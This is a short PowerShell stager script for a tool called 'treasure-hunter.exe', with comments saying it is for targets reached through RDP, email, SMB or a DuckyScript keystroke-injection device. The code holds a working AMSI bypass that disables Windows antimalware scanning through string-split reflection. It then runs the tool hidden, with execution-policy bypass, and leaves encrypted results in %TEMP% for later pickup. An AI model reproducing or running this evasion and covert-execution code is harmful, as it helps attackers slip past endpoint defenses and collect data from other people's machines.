# TREASURE-HUNTER STAGER (Device Drop Mode)
#
# For when the exe is already on the target (staged via RDP, email, SMB, etc.)
# Bypasses AMSI, runs scan, encrypts output to %TEMP%, exits.
#
# Usage from cmd:
#   powershell -w hidden -ep bypass -f stager.ps1
#
# Usage from DuckyScript:
#   STRING powershell -w hidden -ep bypass -f C:\path\stager.ps1
#
# Retrieve results later from: %TEMP%\th-results.jsonl.enc

# AMSI bypass
try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils')
    $f = $a.GetField('am' + 'siInitFailed', 'NonPublic,Static')
    $f.SetValue($null, $true)
} catch {}

# Find the exe -- check same directory as this script, then common locations
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$searchPaths = @(
    (Join-Path $scriptDir "treasure-hunter.exe"),
    ".\treasure-hunter.exe",
    "$env:TEMP\treasure-hunter.exe",
    "C:\Tools\treasure-hunter.exe"
)

$exe = $null
foreach ($p in $searchPaths) {
    if (Test-Path $p) { $exe = (Resolve-Path $p).Path; break }
}

if (-not $exe) { exit 1 }

# Run in auto mode (handles encryption + cleanup automatically)
& $exe --auto --passphrase 'CHANGE-ME'
